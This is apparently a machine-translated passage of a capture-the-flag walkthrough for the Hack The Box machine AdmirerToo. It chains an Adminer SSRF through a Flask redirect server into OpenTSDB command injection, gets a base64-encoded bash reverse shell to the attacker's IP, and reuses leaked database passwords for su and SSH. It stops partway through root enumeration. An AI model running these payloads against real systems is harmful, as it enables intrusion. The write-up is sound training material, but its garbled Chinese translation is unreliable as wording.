SSRF 

# 高温透射精：仰慕者

[0xdf.gitlab.io](https://0xdf.gitlab.io/2022/05/28/htb-admirertoo.html)0xdf黑客的东西

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fadmirertoo-cover.) 

《仰慕者Too》就是把功绩链接在一起。我将使用管理员中的 SSRF 漏洞来发现 OpenTSDB 的本地实例，并使用 SSRF 利用命令注入来获取外壳程序。然后，我将利用 Fail2Ban 中的命令注入，该命令要求我可以控制有关我的 IP 的 whois 查询的结果。我将滥用 OpenCats 中的文件写入漏洞来上传恶意的 whois.conf，然后利用 fail2ban 获取外壳程序。在超越根中，我将看看最终的漏洞利用以及为什么nc一开始对我不起作用，但ncat却起作用了。

## 箱子信息

名字

[仰慕者图](https://www.hackthebox.eu/home/machines/profile/427) ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Ficons%2Fbox-admirertoo.png) 

发行日期

[15 1月 2022](https://twitter.com/hackthebox_eu/status/1481657572113281038)

停用日期

28 五月 2022

操作系统

操作系统 ![](https://image.cubox.pro/article/2022091809192232808/86382.jpg) 

基本点

硬 \[40\]

额定难度

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fadmirertoo-diff.png) 

雷达图

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fadmirertoo-radar.png) 

 ![](https://image.cubox.pro/article/2022091809192294225/76393.jpg) 

1小时31分27秒[![塞莱斯安](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F114435)](https://www.hackthebox.eu/home/users/profile/114435)

 ![](https://image.cubox.pro/article/2022091809192276507/23214.jpg) 

3小时53分17秒[![断续器](https://image.cubox.pro/article/2022091910535330943/81373.jpg)](https://www.hackthebox.eu/home/users/profile/77141)

造物主

[![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F159204)](https://www.hackthebox.eu/home/users/profile/159204)-

## 侦察

### n地图

`nmap`找到两个打开的 TCP 端口，即固态混合端口 （22） 和 HTTP （80）：

    oxdf@hacky$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.137
    Starting Nmap 7.80 ( https://nmap.org ) at 2021-12-15 11:23 EST
    Nmap scan report for 10.10.11.137
    Host is up (0.098s latency).
    Not shown: 65530 closed ports
    PORT      STATE    SERVICE
    22/tcp    open     ssh
    80/tcp    open     http
    4242/tcp  filtered vrml-multi-use
    16010/tcp filtered unknown
    16030/tcp filtered unknown
    
    Nmap done: 1 IP address (1 host up) scanned in 8.49 seconds
    oxdf@hacky$ nmap -p 22,80 -sCV -oA scans/nmap-tcpscripts 10.10.11.137
    Starting Nmap 7.80 ( https://nmap.org ) at 2021-12-15 11:26 EST
    Nmap scan report for 10.10.11.137
    Host is up (0.093s latency).
    
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
    | ssh-hostkey: 
    |   2048 99:33:47:e6:5f:1f:2e:fd:45:a4:ee:6b:78:fb:c0:e4 (RSA)
    |   256 4b:28:53:64:92:57:84:77:5f:8d:bf:af:d5:22:e1:10 (ECDSA)
    |_  256 71:ee:8e:e5:98:ab:08:43:3b:86:29:57:23:26:e9:10 (ED25519)
    80/tcp open  http    Apache httpd 2.4.38 ((Debian))
    |_http-server-header: Apache/2.4.38 (Debian)
    |_http-title: Admirer
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 10.51 seconds
    

还有三个额外的端口返回已过滤，这可能表示防火墙正在阻止它们。

基于 [OpenSSH](https://packages.debian.org/search?keywords=openssh-server) 和[阿帕奇](https://packages.debian.org/search?keywords=apache2)版本，主机可能正在运行 Debian 10 破坏者。

### 网站 - TCP 80

#### 网站

该网站是一个图片库：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20211215113230967.png) 

右上角的 X 不执行任何操作。右下角的聊天会弹出以下表单：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20211215113304045.png) 

发送消息确实会发送带有字段的 POST 请求，但返回的页面与 GET 相同，因此不清楚消息是否实际到达任何地方。

#### 技术堆栈

该网站基于响应标头使用 Apache 托管：

    HTTP/1.1 200 OK
    Date: Wed, 15 Dec 2021 16:33:21 GMT
    Server: Apache/2.4.38 (Debian)
    Vary: Accept-Encoding
    Content-Length: 14059
    Connection: close
    Content-Type: text/html; charset=UTF-8
    ...[snip]...
    

那里没什么好玩的。我可以猜测索引页面上的扩展名，并发现主页是。有趣的是，当我尝试时，404页面泄露了一些信息：`index.php``index.html`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20211215113541779.png) 

IP 上的链接是指向 的邮件链接。在将域添加到我的文件并访问站点时，它仍然是相同的。`webmaster@admirer-gallery.htb``/etc/hosts`

#### 目录暴力破解

我将针对该网站运行，并包括，因为我知道该网站是PHP：`feroxbuster``-x php`

    oxdf@hacky$ feroxbuster -u http://10.10.11.137 -x php
    
     ___  ___  __   __     __      __         __   ___
    |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
    |    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
    by Ben "epi" Risher 🤓                 ver: 2.4.0
    ───────────────────────────┬──────────────────────
     🎯  Target Url            │ http://10.10.11.137
     🚀  Threads               │ 50
     📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
     👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
     💥  Timeout (secs)        │ 7
     🦡  User-Agent            │ feroxbuster/2.4.0
     💲  Extensions            │ [php]
     🔃  Recursion Depth       │ 4
    ───────────────────────────┴──────────────────────
     🏁  Press [ENTER] to use the Scan Cancel Menu™
    ──────────────────────────────────────────────────
    301        9l       29w      361c http://10.10.11.137/css
    301        9l       29w      360c http://10.10.11.137/js
    301        9l       29w      367c http://10.10.11.137/css/fonts
    301        9l       29w      361c http://10.10.11.137/img
    200      268l      656w        0c http://10.10.11.137/index.php
    301        9l       29w      363c http://10.10.11.137/fonts
    301        9l       29w      364c http://10.10.11.137/manual
    301        9l       29w      371c http://10.10.11.137/manual/images
    301        9l       29w      367c http://10.10.11.137/manual/en
    301        9l       29w      367c http://10.10.11.137/manual/de
    301        9l       29w      367c http://10.10.11.137/manual/fr
    301        9l       29w      370c http://10.10.11.137/manual/style
    301        9l       29w      367c http://10.10.11.137/manual/es
    301        9l       29w      367c http://10.10.11.137/manual/ja
    301        9l       29w      367c http://10.10.11.137/manual/tr
    301        9l       29w      367c http://10.10.11.137/manual/ko
    301        9l       29w      367c http://10.10.11.137/manual/da
    301        9l       29w      371c http://10.10.11.137/manual/es/faq
    301        9l       29w      371c http://10.10.11.137/manual/es/ssl
    301        9l       29w      371c http://10.10.11.137/manual/es/mod
    301        9l       29w      378c http://10.10.11.137/manual/style/scripts
    301        9l       29w      372c http://10.10.11.137/manual/da/misc
    301        9l       29w      371c http://10.10.11.137/manual/de/faq
    301        9l       29w      372c http://10.10.11.137/manual/ja/misc
    301        9l       29w      372c http://10.10.11.137/manual/ko/misc
    301        9l       29w      371c http://10.10.11.137/manual/en/faq
    301        9l       29w      371c http://10.10.11.137/manual/de/mod
    301        9l       29w      371c http://10.10.11.137/manual/fr/faq
    301        9l       29w      376c http://10.10.11.137/manual/es/programs
    301        9l       29w      371c http://10.10.11.137/manual/de/ssl
    301        9l       29w      371c http://10.10.11.137/manual/ja/faq
    301        9l       29w      371c http://10.10.11.137/manual/tr/faq
    301        9l       29w      371c http://10.10.11.137/manual/ko/faq
    301        9l       29w      371c http://10.10.11.137/manual/en/ssl
    301        9l       29w      371c http://10.10.11.137/manual/ja/ssl
    301        9l       29w      371c http://10.10.11.137/manual/fr/ssl
    [####################] - 2m   2159928/2159928 0s      found:36      errors:1044110
    [####################] - 1m     59998/59998   833/s   http://10.10.11.137
    [####################] - 1m     59998/59998   647/s   http://10.10.11.137/css
    [####################] - 1m     59998/59998   725/s   http://10.10.11.137/js
    [####################] - 1m     59998/59998   744/s   http://10.10.11.137/css/fonts
    [####################] - 1m     59998/59998   670/s   http://10.10.11.137/img
    [####################] - 1m     59998/59998   768/s   http://10.10.11.137/fonts
    [####################] - 1m     59998/59998   739/s   http://10.10.11.137/manual
    [####################] - 1m     59998/59998   783/s   http://10.10.11.137/manual/images
    [####################] - 1m     59998/59998   785/s   http://10.10.11.137/manual/en
    ...[snip]...
    

Nothing interesting there.

### Subdomain Brute Force

Given the use of the domain , I’ll look for other subdomains that may use virtual host routing to give a different site. I’ll run to show me anything that doesn’t match the default returned size of 14058 characters (, which I found by running it once without the filter and seeing that length):`admirer-gallery.htb``wuzz``--hh 14058`

    oxdf@hacky$ wfuzz -H "Host: FUZZ.admirer-gallery.htb" -u http://10.10.11.137 -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --hh 14058
    
    ********************************************************
    * Wfuzz 2.4.5 - The Web Fuzzer                         *
    ********************************************************
    
    Target: http://10.10.11.137/
    Total requests: 100000
    
    ===================================================================
    ID           Response   Lines    Word     Chars       Payload                                                                                                                                           
    ===================================================================
    
    000000143:   200        62 L     169 W    2569 Ch     "db"
    000037212:   400        12 L     54 W     483 Ch      "*"
    
    Total time: 1024.343
    Processed Requests: 100000
    Filtered Requests: 99998
    Requests/sec.: 97.62351
    

db is an interesting domain.

### db.admirer-gallery.htb

#### Site

访问此页面是管理员的一个实例：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20211215114352444.png) 

它似乎已配置为我已经登录。这是不寻常的，我稍后会看看为什么。

单击“输入”将转到数据库：

[![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20211215114703012.png)_点击查看全尺寸图片_](https://0xdf.gitlab.io/img/image-20211215114703012.png)

只有一个表，数据并不有趣：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20211215114750027.png) 

我将尝试编辑 SQL 以从主机系统读取文件，但用户缺少权限：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20211215115035828.png) 

运行确实会泄漏哈希值，但并不容易破解：`SHOW GRANTS`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20211215115938801.png) 

这表明用户只有 SELECT privs，并且帐户具有 ，[文档](https://dev.mysql.com/doc/refman/8.0/en/grant.html)说这相当于没有 privs。`admirer``admirer_ro``USAGE`

#### 技术堆栈/漏洞利用

该网站由同一个网站托管。管理员是一个基于PHP的应用程序，访问可以验证这一点。`/index.php`

该站点确实将自己标识为管理员 4.7.8。存在漏洞 [CVE-2021-21311](https://nvd.nist.gov/vuln/detail/CVE-2021-21311)，这是管理员版本 4.0.0 中的服务器端请求伪造。至 4.7.9。

#### 目录暴力破解

与上面的目录蛮力类似。目录中有大量无趣的东西，所以我将使用它来删除它（为了可读性）：`manual``--dont-scan manual/`

    oxdf@hacky$ feroxbuster -u http://db.admirer-gallery.htb -x php --dont-scan manual/
    
     ___  ___  __   __     __      __         __   ___
    |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
    |    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
    by Ben "epi" Risher 🤓                 ver: 2.7.1
    ───────────────────────────┬──────────────────────
     🎯  Target Url            │ http://db.admirer-gallery.htb
     🚫  Don't Scan Regex      │ manual/
     🚀  Threads               │ 50
     📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
     👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
     💥  Timeout (secs)        │ 7
     🦡  User-Agent            │ feroxbuster/2.7.1
     💲  Extensions            │ [php]
     🏁  HTTP methods          │ [GET]
     🔃  Recursion Depth       │ 4
    ───────────────────────────┴──────────────────────
     🏁  Press [ENTER] to use the Scan Management Menu™
    ──────────────────────────────────────────────────
    301      GET        9l       29w      385c http://db.admirer-gallery.htb/plugins => http://db.admirer-gallery.htb/plugins/
    200      GET       62l      169w        0c http://db.admirer-gallery.htb/
    403      GET        9l       29w      338c http://db.admirer-gallery.htb/.php
    200      GET       62l      169w        0c http://db.admirer-gallery.htb/index.php
    301      GET        9l       29w      384c http://db.admirer-gallery.htb/manual => http://db.admirer-gallery.htb/manual/
    [####################] - 1m    240000/240000  0s      found:5       errors:136    
    [####################] - 1m     60000/60000   532/s   http://db.admirer-gallery.htb 
    [####################] - 0s     60000/60000   0/s     http://db.admirer-gallery.htb/plugins => Directory listing (add -e to scan)
    [####################] - 1m     60000/60000   533/s   http://db.admirer-gallery.htb/ 
    [####################] - 0s     60000/60000   84860/s http://db.admirer-gallery.htb/manual
    

有一个目录，并显示目录列表已启用，我可以确认：`plugins``feroxbuster`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20211215121047371.png) 

`oneclick-login.php`是一个管理员插件，[一键登录](https://github.com/giofreitas/one-click-login)。它是围绕基本页面的包装器，无需身份验证即可设置登录。这就解释了为什么与数据库交互不需要密码。`adminer.php`

## 壳体作为开放数据库

### 管理员中的 SSRF

#### CVE-2021-21311 POC

[本文](https://github.com/vrana/adminer/files/5957311/Adminer.SSRF.pdf)详细介绍了CVE-2021-21311的工作原理，使用处理弹性搜索登录的模块让服务器代表我发出请求。

SSRF 是指攻击者可以让服务器代表他们发出请求。在这种情况下，攻击者仅控制请求中的服务器字段，这将在除主机名或 IP 之外的任何内容上出错。诀窍是为我控制的服务器（例如，我的VM）的IP提供IP，然后让我的Web服务器使用301重定向进行响应。然后，服务器将访问该重定向中的完整URL，并在页面上返回查询结果。

#### No Elastic?

The first challenge here is that I don’t get a login page to select Elasticsearch and give a server IP, because of the OneClick Login plugin. Still if I look at the POST request that comes from clicking “Enter”, it includes the same parameters that are normally in the form:

    POST / HTTP/1.1
    Host: db.admirer-gallery.htb
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: http://db.admirer-gallery.htb/
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 162
    Origin: http://db.admirer-gallery.htb
    Connection: close
    Cookie: adminer_version=4.8.1; adminer_permanent=; adminer_sid=gc4k4jh4lt65un371410p0m17d; adminer_key=806174fe7b7ce8f715004727b936a826
    Upgrade-Insecure-Requests: 1
    
    auth%5Bdriver%5D=server&auth%5Bserver%5D=localhost&auth%5Busername%5D=admirer_ro&auth%5Bpassword%5D=1w4nn4b3adm1r3d2%21&auth%5Bdb%5D=admirer&auth%5Bpermanent%5D=1
    

起初，我尝试将其发送到中继器并对其进行修改，但它不起作用。我相信 cookie 会根据每个请求进行更改，这使得它不可重复。`adminer_sid`

但是拦截POST并对其进行编辑确实有效。我将单击“输入”，并在Burp中拦截该请求。我将编辑 POST 数据，将 设置为“弹性”和我的 IP：`auth[driver]``auth[server]`

[![image-20211215123027195](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20211215123027195.png)_点击查看全尺寸图片_](https://0xdf.gitlab.io/img/image-20211215123027195.png)

响应是重定向到 ：`?elastic`

    HTTP/1.1 302 Found
    Date: Wed, 15 Dec 2021 17:28:22 GMT
    Server: Apache/2.4.38 (Debian)
    Set-Cookie: adminer_sid=tmii352kufpdsc3l3vj8k5krue; path=/; HttpOnly
    Set-Cookie: adminer_permanent=ZWxhc3RpYw%3D%3D-MTAuMTAuMTQuNg%3D%3D-YWRtaXJlcl9ybw%3D%3D-YWRtaXJlcg%3D%3D%3Avzc6orsY6HwZ%2BvBgn8gw%2FLjefr8mdtQi; expires=Fri, 14 Jan 2022 17:28:22 GMT; path=/; HttpOnly; SameSite=lax
    Location: ?elastic=10.10.14.6&username=admirer_ro&db=admirer
    Content-Length: 0
    Connection: close
    Content-Type: text/html; charset=UTF-8
    

当该请求完成时，在侦听时有一个请求：`nc`

    oxdf@hacky$ nc -lnvp 80
    Listening on 0.0.0.0 80
    Connection received on 10.10.11.137 56058
    GET / HTTP/1.0
    Authorization: Basic YWRtaXJlcl9ybzo=
    Host: 10.10.14.6
    Connection: close
    Content-Length: 2
    Content-Type: application/json
    
    []
    

#### 问题重定向

漏洞利用描述中有一个 POC，使用旧版 Python 执行重定向。我在[Forge](https://0xdf.gitlab.io/2022/01/22/htb-forge.html#redirection-to-admin)中使用Flaks做了类似的事情，所以我将在这里做同样的事情。

    #!/usr/bin/env python
    
    import sys
    from flask import Flask, redirect, request
    
    app = Flask(__name__)
    
    @app.route("/")
    def admin():
        return redirect(sys.argv[1])
    
    
    if __name__ == "__main__":
        app.run(debug=True, host="0.0.0.0", port=80)
    

此脚本将重定向到我在命令行中提供的任何内容作为下一个URL。为了测试它，我只是让它重定向到我的服务器：`/test`

    oxdf@hacky$ python redirect.py '/test'
     * Serving Flask app 'redirect' (lazy loading)
     * Environment: production
       WARNING: This is a development server. Do not use it in a production deployment.
       Use a production WSGI server instead.
     * Debug mode: on
     * Running on all addresses.
       WARNING: This is a development server. Do not use it in a production deployment.
     * Running on http://10.1.1.159:80/ (Press CTRL+C to quit)
     * Restarting with stat
     * Debugger is active!
     * Debugger PIN: 864-547-918
    

现在我再次登录（拦截和修改服务器和类型），并在发送重定向时，请求到达服务器，然后它请求（实际上是两次）：`/test`

    10.10.11.137 - - [15/Dec/2021 12:34:56] "GET / HTTP/1.0" 302 -
    10.10.11.137 - - [15/Dec/2021 12:34:56] "GET /test HTTP/1.0" 404 -
    10.10.11.137 - - [15/Dec/2021 12:34:57] "GET / HTTP/1.0" 302 -
    10.10.11.137 - - [15/Dec/2021 12:34:57] "GET /test HTTP/1.0" 404 -
    

是成功的 SSRF 漏洞。

#### 列举

现在我可以让爱慕者Too发送请求，我将检查原始中防火墙阻止的端口。16010和16030上的服务没有返回任何东西（两者都只是挂了）。但是，当 Flask 服务器运行为 时，页面将返回 HTML（为便于阅读而添加了空格）：`nmap``python redirect.py 'http://localhost:4242'`

    <!DOCTYPE html>
    <html>
        <head>
            <meta http-equiv=content-type content="text/html;charset=utf-8">
            <title>OpenTSDB</title>
            <style><!-- 
    ...[snip]...
            </style>
            <script type=text/javascript language=javascript src=s/queryui.nocache.js></script>
        </head>
        <body text=#000000 bgcolor=#ffffff>
            <table border=0 cellpadding=2 cellspacing=0 width=100%>
                <tr>
                    <td rowspan=3 width=1% nowrap>
                        <img src=s/opentsdb_header.jpg>
                    <td>&nbsp;</td>
                </tr>
                <tr>
                    <td>
                        <font color=#507e9b><b></b>
                    </td>
                </tr>
                <tr>
                    <td>&nbsp;</td>
                </tr>
            </table>
            <div id=queryuimain></div>
            <noscript>You must have JavaScript enabled.</noscript>
            <iframe src=javascript:'' id=__gwt_historyFrame tabIndex=-1 style=position:absolute;width:0;height:0;border:0></iframe>
            <table width=100% cellpadding=0 cellspacing=0>
                <tr>
                    <td class=subg>
                        <img alt="" width=1 height=6>
                    </td>
                </tr>
            </table>
        </body>
    </html>
    

该页面显示不多，因为“您必须启用 JavaScript”，但标签很有趣：OpenTSDB。`<title>`

### 开放贸易统计局中的RCE

#### 断续器

开放TSDB是一个在哈道普和HBase上运行的时间序列数据库。它是一个 Java 应用程序，源代码托管[在 GitHub 上](https://github.com/OpenTSDB/opentsdb)。

某些谷歌搜索返回[CVE-2020-35476](https://github.com/OpenTSDB/opentsdb/issues/2051)，这是OpenTSDB中的远程代码执行。这是一个较旧的漏洞，但它仅限于本地主机访问，因此管理员可能认为它是安全的。

#### 初始失败

我将使用上面链接的GitHub问题中的有效负载，将其域替换为，以便AmirerToo联系其自己的实例，并将有效负载从文件更改为我的主机：`localhost``touch``ping`

    http://localhost:4242/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:sys.cpu.nice&o=&ylabel=&xrange=10:10&yrange=[33:system('ping+-c+1+10.10.14.6')]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json
    

将该 URL 设置为控制器并再次执行登录过程时，该页面将返回一个巨大的 Java 错误：

[![image-20211215130048364](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20211215130048364.png)_点击查看全尺寸图片_](https://0xdf.gitlab.io/img/image-20211215130048364.png)

该消息的最底部是导致崩溃的原因：

[![image-20211215130158373](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20211215130158373.png)_点击查看全尺寸图片_](https://0xdf.gitlab.io/img/image-20211215130158373.png)

上面的 URL 使用 ，但此主机上不存在。`m=sum:sys.cpu.nice`

#### 查找指标

在谷歌搜索此错误时，我最终找到了[这个StackOverflow帖子](https://stackoverflow.com/questions/50217959/list-of-opentsdb-metrics)，它说它将返回具有正确参数的可用指标。我将重定向设置为 ，然后再次登录：`/api/suggests``http://localhost:4242/api/suggest/?type=metrics&q=&max=20`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20211215131206846.png) 

我真的不知道这意味着什么，但我愿意尝试一下。我将重定向URL更新为上面的内容，但这次使用新指标：

    http://localhost:4242/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:http.stats.web.hits&o=&ylabel=&xrange=10:10&yrange=[33:system('ping+-c+1+10.10.14.6')]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json
    

现在登录时，返回的数据看起来不像错误：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20211215131500572.png) 

更重要的是，我得到：`pings`

    oxdf@hacky$ sudo tcpdump -ni tun0 icmp
    tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
    listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
    13:13:58.231154 IP 10.10.11.137 > 10.10.14.6: ICMP echo request, id 2851, seq 1, length 64
    13:13:58.231180 IP 10.10.14.6 > 10.10.11.137: ICMP echo reply, id 2851, seq 1, length 64
    

#### 壳

我将创建一个有效负载，以避免在 URL 中加上引号：

    oxdf@hacky$ echo "bash  -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'" | base64 
    YmFzaCAgLWMgJ2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMScK
    

我将使用新的重定向 URL 重新启动 Flask 服务器：

    oxdf@hacky$ python redirect.py "http://localhost:4242/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:http.stats.web.hits&o=&ylabel=&xrange=10:10&yrange=[33:system('echo+YmFzaCAgLWMgJ2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMScK|base64+-d|bash')]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json"
     * Serving Flask app 'redirect' (lazy loading)
     * Environment: production
       WARNING: This is a development server. Do not use it in a production deployment.
       Use a production WSGI server instead.
     * Debug mode: on
     * Running on all addresses.
       WARNING: This is a development server. Do not use it in a production deployment.
     * Running on http://10.1.1.159:80/ (Press CTRL+C to quit)
     * Restarting with stat
     * Debugger is active!
     * Debugger PIN: 864-547-918
    

当我登录时，我在收听时得到一个外壳：`nc`

    oxdf@hacky$ nc -lnvp 443
    Listening on 0.0.0.0 443
    Connection received on 10.10.11.137 34436
    bash: cannot set terminal process group (540): Inappropriate ioctl for device
    bash: no job control in this shell
    opentsdb@admirertoo:/$ $ id
    uid=1000(opentsdb) gid=1000(opentsdb) groups=1000(opentsdb)
    

我将使用以下命令升级外壳：`script`

    opentsdb@admirertoo:/$ script /dev/null -c bash
    script /dev/null -c bash
    Script started, file is /dev/null
    opentsdb@admirertoo:/$ ^Z
    [1]+  Stopped                 nc -lnvp 443
    oxdf@hacky$ stty raw -echo; fg
    nc -lnvp 443
                reset
    reset: unknown terminal type unknown
    Terminal type? screen
    opentsdb@admirertoo:/$
    

## 谢尔 饰 詹妮弗

### 列举

#### 家庭目录

盒子上只有一个用户主目录，詹妮弗：

    opentsdb@admirertoo:/home$ ls
    jennifer
    

此目录包含 ，但我无法读取它。`user.txt`

#### 蹼

`/etc/apache2/sites-enabled/000-default.conf`显示两个虚拟主机，托管在 的和托管的 。没有多大意思。`admirer-gallery.htb``/var/www/html``db.admirer-gallery.htb``/var/www/adminer``var/www/html`

在 中，有目录，就像在初始枚举中观察到的目录一样。在 中，有 ，它保存数据库的信誉：`adminer``plugins``data``servers.php`

    <?php
    return [
      'localhost' => array(
    //    'username' => 'admirer',
    //    'pass'     => 'bQ3u7^AxzcB7qAsxE3',
    // Read-only account for testing
        'username' => 'admirer_ro',
        'pass'     => '1w4nn4b3adm1r3d2!',
        'label'    => 'MySQL',
        'databases' => array(
          'admirer' => 'Admirer DB',
        )
      ),
    ];
    

### 苏 / 固态混合酶

注释掉的密码“bQ3u7^AxzcB7qAsxE3”适用于詹妮弗：`su`

    opentsdb@admirertoo:/var/www/adminer/plugins/data$ su - jennifer
    Password: 
    jennifer@admirertoo:~$
    

它也适用于 SSH：

    oxdf@hacky$ sshpass -p 'bQ3u7^AxzcB7qAsxE3' ssh jennifer@10.10.11.137
    ...[snip]...
    jennifer@admirertoo:~$ 
    

从那里，我可以读到：`user.txt`

    jennifer@admirertoo:~$ cat user.txt
    a23b09cb************************
    

## 外壳作为根

### 列举

#### 侦听端口

盒子上没有太多新的东西，我可以作为詹妮弗访问，我以前无法访问。在这一点上，我将查看侦听端口：

    jennifer@admirertoo:~$ netstat -tnlp
    Active Internet connections (only servers)
    Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
    tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
    tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -
    tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
    tcp6       0      0 :::16030                :::*                    LISTEN      -
    tcp6       0      0 127.0.1.1:16000         :::*                    LISTEN      -
    tcp6       0      0 127.0.0.1:2181          :::*                    LISTEN      -
    tcp6       0      0 :::16010                :::*                    LISTEN      -
    tcp6       0      0 :::80                   :::*                    LISTEN      -
    tcp6       0      0 :::4242                 :::*                    LISTEN      -
    tcp6       0      0 127.0.1.1:16020         :::*                    LISTEN      -
    tcp6       0      0 :::22                   :::*                    LISTEN      -
    

这里有几个端口仅在我想检查的本地主机上侦听。

我将重新连接创建一堆隧道：`ssh`

    oxdf@hacky$ sshpass -p 'bQ3u7^AxzcB7qAsxE3' ssh jennifer@10.10.11.137 -L 8081:localhost:8080 -L 16030:localhost:16030 -L 2181:localhost:2181 -L 16010:localhost:16010 -L 16020:localhost:16020
    ...[snip]...
    jennifer@admirertoo:~$ 
    

2181、16010、16020 和 16030 都只是超时或重置。

#### 开放猫

转到火狐加载一个开放猫实例的登录表单：`http://localhost:8081`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20211215135431335.png) 

[开放猫](https://www.opencats.org/)是一个免费的开源申请人跟踪系统。该表单还会泄漏版本 0.9.5.2。

詹妮弗工作的信誉登录：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20211215145238195.png) 

对应用程序没有太多兴趣。

此应用程序的配置位于 中。从中提取未注释的行具有以下特性：`/etc/apache2-opencats``apache2.conf`

    jennifer@admirertoo:/etc/apache2-opencats$ grep -v "^#" apache2.conf | grep .
    DefaultRuntimeDir ${APACHE_RUN_DIR}
    PidFile ${APACHE_PID_FILE}
    Timeout 300
    KeepAlive On
    MaxKeepAliveRequests 100
    KeepAliveTimeout 5
    User devel
    Group devel
    HostnameLookups Off
    ErrorLog ${APACHE_LOG_DIR}/error.log
    LogLevel warn
    IncludeOptional mods-enabled/*.load
    IncludeOptional mods-enabled/*.conf
    Include ports.conf
    <Directory />
            Options FollowSymLinks
            AllowOverride None
            Require all denied
    </Directory>
    <Directory /usr/share>
            AllowOverride None
            Require all granted
    </Directory>
    <Directory /opt/opencats>
            Options Indexes FollowSymLinks
            AllowOverride None
            Require all granted
    </Directory>
    AccessFileName .htaccess
    <FilesMatch "^\.ht">
            Require all denied
    </FilesMatch>
    LogFormat "%v:%p %h %l %u %t \"%r\" %>s %O \"%{Referer}i\" \"%{User-Agent}i\"" vhost_combined
    LogFormat "%h %l %u %t \"%r\" %>s %O \"%{Referer}i\" \"%{User-Agent}i\"" combined
    LogFormat "%h %l %u %t \"%r\" %>s %O" common
    LogFormat "%{Referer}i -> %U" referer
    LogFormat "%{User-agent}i" agent
    IncludeOptional conf-enabled/*.conf
    IncludeOptional sites-enabled/*.conf
    

